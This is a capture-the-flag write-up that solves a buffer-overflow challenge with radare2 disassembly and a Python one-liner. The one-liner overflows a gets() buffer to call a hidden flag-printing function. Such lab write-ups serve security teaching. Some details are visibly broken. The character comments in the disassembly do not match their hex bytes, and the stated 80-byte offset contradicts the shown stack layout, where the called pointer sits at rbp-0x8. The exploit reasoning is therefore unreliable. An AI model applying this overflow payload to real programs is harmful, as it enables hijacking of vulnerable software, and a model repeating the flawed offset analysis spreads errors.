# Go with the flow

Once again, similar to the previous three challenges, this involves buffer overflow as well. Only this time, we need to call a function after we overflow the stack.
That is the intended way to do that atleast. 

We'll use a reversing tool commonly used called [radare2](https://github.com/radareorg/radare2). To read all its commands and basic How-To's refer to [this](https://medium.com/@jacob16682/reverse-engineering-using-radare2-588775ea38d5).

We'll start by running radare2 and analyzing the binary :

```
>>>r2 Go_with_the_flow


 -- Can you stand on your head?
[0x00001060]> aaaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Finding function preludes
[x] Enable constraint types analysis for variables
```

Next, it spawns a somewhat interactive shell of its shown showing the current position of the pointer. The "aaaa" command is used to analyse the binary given. 

Now, we will try to print all functions and sections in this binary. This can be done by:

```
[0x00001060]> afl
0x00001060    1 42           entry0
0x00001090    4 41   -> 34   sym.deregister_tm_clones
0x000010c0    4 57   -> 51   sym.register_tm_clones
0x00001100    5 57   -> 50   sym.__do_global_dtors_aux
0x00001140    1 5            entry.init0
0x00001000    3 23           sym._init
0x000013b0    1 1            sym.__libc_csu_fini
0x000013b4    1 9            sym._fini
0x00001145    3 432          sym.winfucntion
0x00001030    1 6            sym.imp.printf
0x00001350    4 93           sym.__libc_csu_init
0x000012f5    4 82           main
0x00001040    1 6            sym.imp.gets
```

"afl" command lists all functions. Now the function, sym.winfucntion seems out of place. We will disassemble this function and print its stack by:

```asm
[0x00001060]> pdf @sym.winfucntion

┌ 432: sym.winfucntion (uint32_t arg1, int64_t arg_30h, int64_t arg_54h, int64_t arg_64h, int64_t arg_74h);
│           ; var uint32_t var_24h @ rbp-0x24
│           ; var char *format @ rbp-0x20
│           ; var int64_t var_4h @ rbp-0x4
│           ; arg int64_t arg_30h @ rbp+0x30
│           ; arg int64_t arg_54h @ rbp+0x54
│           ; arg int64_t arg_64h @ rbp+0x64
│           ; arg int64_t arg_74h @ rbp+0x74
│           ; arg uint32_t arg1 @ rdi
│           0x00001145      55             push rbp
│           0x00001146      4889e5         mov rbp, rsp
│           0x00001149      4883ec30       sub rsp, 0x30
│           0x0000114d      897ddc         mov dword [var_24h], edi    ; arg1
│           0x00001150      837ddc01       cmp dword [var_24h], 1
│       ┌─< 0x00001154      0f8598010000   jne 0x12f2
│       │   0x0000115a      c745fc000000.  mov dword [var_4h], 0
│       │   0x00001161      8b45fc         mov eax, dword [var_4h]
│       │   0x00001164      8d5001         lea edx, [rax + 1]
│       │   0x00001167      8955fc         mov dword [var_4h], edx
│       │   0x0000116a      4898           cdqe
│       │   0x0000116c      c64405e042     mov byte [rbp + rax - 0x20], 0x42 ; 'R'
│       │   0x00001171      8b45fc         mov eax, dword [var_4h]
│       │   0x00001174      8d5001         lea edx, [rax + 1]
│       │   0x00001177      8955fc         mov dword [var_4h], edx
│       │   0x0000117a      4898           cdqe
│       │   0x0000117c      c64405e049     mov byte [rbp + rax - 0x20], 0x49 ; 'E'
│       │   0x00001181      8b45fc         mov eax, dword [var_4h]
│       │   0x00001184      8d5001         lea edx, [rax + 1]
│       │   0x00001187      8955fc         mov dword [var_4h], edx
│       │   0x0000118a      4898           cdqe
│       │   0x0000118c      c64405e054     mov byte [rbp + rax - 0x20], 0x54 ; 'D'
│       │   0x00001191      8b45fc         mov eax, dword [var_4h]
│       │   0x00001194      8d5001         lea edx, [rax + 1]
│       │   0x00001197      8955fc         mov dword [var_4h], edx
│       │   0x0000119a      4898           cdqe
│       │   0x0000119c      c64405e053     mov byte [rbp + rax - 0x20], 0x53 ; 'A'
│       │   0x000011a1      8b45fc         mov eax, dword [var_4h]
│       │   0x000011a4      8d5001         lea edx, [rax + 1]
│       │   0x000011a7      8955fc         mov dword [var_4h], edx
│       │   0x000011aa      4898           cdqe
│       │   0x000011ac      c64405e043     mov byte [rbp + rax - 0x20], 0x43 ; 'C'
│       │   0x000011b1      8b45fc         mov eax, dword [var_4h]
│       │   0x000011b4      8d5001         lea edx, [rax + 1]
│       │   0x000011b7      8955fc         mov dword [var_4h], edx
│       │   0x000011ba      4898           cdqe
│       │   0x000011bc      c64405e054     mov byte [rbp + rax - 0x20], 0x54 ; 'T'
│       │   0x000011c1      8b45fc         mov eax, dword [var_4h]
│       │   0x000011c4      8d5001         lea edx, [rax + 1]
│       │   0x000011c7      8955fc         mov dword [var_4h], edx
│       │   0x000011ca      4898           cdqe
│       │   0x000011cc      c64405e046     mov byte [rbp + rax - 0x20], 0x46 ; 'E'
│       │   0x000011d1      8b45fc         mov eax, dword [var_4h]
│       │   0x000011d4      8d5001         lea edx, [rax + 1]
│       │   0x000011d7      8955fc         mov dword [var_4h], edx
│       │   0x000011da      4898           cdqe
│       │   0x000011dc      c64405e07b     mov byte [rbp + rax - 0x20], 0x7b ; 'D'
│       │   0x000011e1      8b45fc         mov eax, dword [var_4h]
│       │   0x000011e4      8d5001         lea edx, [rax + 1]
│       │   0x000011e7      8955fc         mov dword [var_4h], edx
│       │   0x000011ea      4898           cdqe
│       │   0x000011ec      c64405e072     mov byte [rbp + rax - 0x20], 0x72 ; 'T'
│       │   0x000011f1      8b45fc         mov eax, dword [var_4h]
│       │   0x000011f4      8d5001         lea edx, [rax + 1]
│       │   0x000011f7      8955fc         mov dword [var_4h], edx
│       │   0x000011fa      4898           cdqe
│       │   0x000011fc      c64405e033     mov byte [rbp + rax - 0x20], 0x33 ; 'H'
│       │   0x00001201      8b45fc         mov eax, dword [var_4h]
│       │   0x00001204      8d5001         lea edx, [rax + 1]
│       │   0x00001207      8955fc         mov dword [var_4h], edx
│       │   0x0000120a      4898           cdqe
│       │   0x0000120c      c64405e076     mov byte [rbp + rax - 0x20], 0x76 ; 'E'
│       │   0x00001211      8b45fc         mov eax, dword [var_4h]
│       │   0x00001214      8d5001         lea edx, [rax + 1]
│       │   0x00001217      8955fc         mov dword [var_4h], edx
│       │   0x0000121a      4898           cdqe
│       │   0x0000121c      c64405e05f     mov byte [rbp + rax - 0x20], 0x5f ; 'F'
│       │   0x00001221      8b45fc         mov eax, dword [var_4h]
│       │   0x00001224      8d5001         lea edx, [rax + 1]
│       │   0x00001227      8955fc         mov dword [var_4h], edx
│       │   0x0000122a      4898           cdqe
│       │   0x0000122c      c64405e061     mov byte [rbp + rax - 0x20], 0x61 ; 'L'
│       │   0x00001231      8b45fc         mov eax, dword [var_4h]
│       │   0x00001234      8d5001         lea edx, [rax + 1]
│       │   0x00001237      8955fc         mov dword [var_4h], edx
│       │   0x0000123a      4898           cdqe
│       │   0x0000123c      c64405e031     mov byte [rbp + rax - 0x20], 0x31 ; 'A'
│       │   0x00001241      8b45fc         mov eax, dword [var_4h]
│       │   0x00001244      8d5001         lea edx, [rax + 1]
│       │   0x00001247      8955fc         mov dword [var_4h], edx
│       │   0x0000124a      4898           cdqe
│       │   0x0000124c      c64405e06e     mov byte [rbp + rax - 0x20], 0x6e ; 'G'
│       │   0x00001251      8b45fc         mov eax, dword [var_4h]
│       │   0x00001254      8d5001         lea edx, [rax + 1]
│       │   0x00001257      8955fc         mov dword [var_4h], edx
│       │   0x0000125a      4898           cdqe
│       │   0x0000125c      c64405e074     mov byte [rbp + rax - 0x20], 0x74 ; 'G'
│       │   0x00001261      8b45fc         mov eax, dword [var_4h]
│       │   0x00001264      8d5001         lea edx, [rax + 1]
│       │   0x00001267      8955fc         mov dword [var_4h], edx
│       │   0x0000126a      4898           cdqe
│       │   0x0000126c      c64405e05f     mov byte [rbp + rax - 0x20], 0x5f ; 'E'
│       │   0x00001271      8b45fc         mov eax, dword [var_4h]
│       │   0x00001274      8d5001         lea edx, [rax + 1]
│       │   0x00001277      8955fc         mov dword [var_4h], edx
│       │   0x0000127a      4898           cdqe
│       │   0x0000127c      c64405e073     mov byte [rbp + rax - 0x20], 0x73 ; 'T'
│       │   0x00001281      8b45fc         mov eax, dword [var_4h]
│       │   0x00001284      8d5001         lea edx, [rax + 1]
│       │   0x00001287      8955fc         mov dword [var_4h], edx
│       │   0x0000128a      4898           cdqe
│       │   0x0000128c      c64405e030     mov byte [rbp + rax - 0x20], 0x30 ; 'R'
│       │   0x00001291      8b45fc         mov eax, dword [var_4h]
│       │   0x00001294      8d5001         lea edx, [rax + 1]
│       │   0x00001297      8955fc         mov dword [var_4h], edx
│       │   0x0000129a      4898           cdqe
│       │   0x0000129c      c64405e05f     mov byte [rbp + rax - 0x20], 0x5f ; 'E'
│       │   0x000012a1      8b45fc         mov eax, dword [var_4h]
│       │   0x000012a4      8d5001         lea edx, [rax + 1]
│       │   0x000012a7      8955fc         mov dword [var_4h], edx
│       │   0x000012aa      4898           cdqe
│       │   0x000012ac      c64405e062     mov byte [rbp + rax - 0x20], 0x62 ; 'K'
│       │   0x000012b1      8b45fc         mov eax, dword [var_4h]
│       │   0x000012b4      8d5001         lea edx, [rax + 1]
│       │   0x000012b7      8955fc         mov dword [var_4h], edx
│       │   0x000012ba      4898           cdqe
│       │   0x000012bc      c64405e061     mov byte [rbp + rax - 0x20], 0x61 ; 'T'
│       │   0x000012c1      8b45fc         mov eax, dword [var_4h]
│       │   0x000012c4      8d5001         lea edx, [rax + 1]
│       │   0x000012c7      8955fc         mov dword [var_4h], edx
│       │   0x000012ca      4898           cdqe
│       │   0x000012cc      c64405e064     mov byte [rbp + rax - 0x20], 0x64 ; 'X'
│       │   0x000012d1      8b45fc         mov eax, dword [var_4h]
│       │   0x000012d4      8d5001         lea edx, [rax + 1]
│       │   0x000012d7      8955fc         mov dword [var_4h], edx
│       │   0x000012da      4898           cdqe
│       │   0x000012dc      c64405e07d     mov byte [rbp + rax - 0x20], 0x7d ; 'D'
│       │   0x000012e1      488d45e0       lea rax, [format]
│       │   0x000012e5      4889c7         mov rdi, rax                ; const char *format
│       │   0x000012e8      b800000000     mov eax, 0
│       │   0x000012ed      e83efdffff     call sym.imp.printf         ; int printf(const char *format)
│       │   ; CODE XREF from sym.winfucntion @ 0x1154
│       └─> 0x000012f2      90             nop
│           0x000012f3      c9             leave
└           0x000012f4      c3             ret
```

With this disassembled function you can see, the flag has been broken into different parts letter by letter. Bring them all together, to get the flag!

Also, as mentioned before, this is not the correct way to solve this challenge. To solve this challenge, we need to first find the point of its buffer overflow.We can disassemble the main function for that :

```asm
[0x00001060]> pdf @main
            ; DATA XREF from entry0 @ 0x107d
┌ 82: int main (int argc, char **argv, char **envp);
│           ; var char *s @ rbp-0x50
│           ; var uint32_t var_8h @ rbp-0x8
│           0x000012f5      55             push rbp
│           0x000012f6      4889e5         mov rbp, rsp
│           0x000012f9      4883ec50       sub rsp, 0x50
│           0x000012fd      48c745f80000.  mov qword [var_8h], 0
│           0x00001305      488d45b0       lea rax, [s]
│           0x00001309      4889c7         mov rdi, rax                ; char *s
│           0x0000130c      b800000000     mov eax, 0
│           0x00001311      e82afdffff     call sym.imp.gets           ; char *gets(char *s)
│           0x00001316      48837df800     cmp qword [var_8h], 0
│       ┌─< 0x0000131b      7412           je 0x132f
│       │   0x0000131d      488b55f8       mov rdx, qword [var_8h]
│       │   0x00001321      bf01000000     mov edi, 1
│       │   0x00001326      b800000000     mov eax, 0
│       │   0x0000132b      ffd2           call rdx
│      ┌──< 0x0000132d      eb11           jmp 0x1340
│      ││   ; CODE XREF from main @ 0x131b
│      │└─> 0x0000132f      488d3dce0c00.  lea rdi, str.Code_flows_like_water ; 0x2004 ; "Code flows like water" ; const char *format
│      │    0x00001336      b800000000     mov eax, 0
│      │    0x0000133b      e8f0fcffff     call sym.imp.printf         ; int printf(const char *format)
│      │    ; CODE XREF from main @ 0x132d
│      └──> 0x00001340      b800000000     mov eax, 0
│           0x00001345      c9             leave
└           0x00001346      c3             ret
```

Here, notice :
```asm
0x000012f9      4883ec50       sub rsp, 0x50
```
What happens here is that, the stack pointer is shifted by 0x50 or 80 in decimal. Hence the buffer capacity for our stack is 80. Next we try to overflow the buffer and try to call the function sym.winfucntion . To do that, after we overflow the buffer, we will add the memory address of the sym.winfucntion which is '0x00001145' as seen in the output of our afl command. Again due to the difference in [endianness](https://en.wikipedia.org/wiki/Endianness) we will enter it backwards, i.e 0x45 first, 0x11 next. Also this time I'll be using python to print all the A's and the hex bytes. Why? Cos I'm lazy to type A's.

```
>>>python -c "print 'A' * 80 + '\x45\x11\x00\x00'" | ./Go_with_the_flow

<REDACTED_FLAG>
```


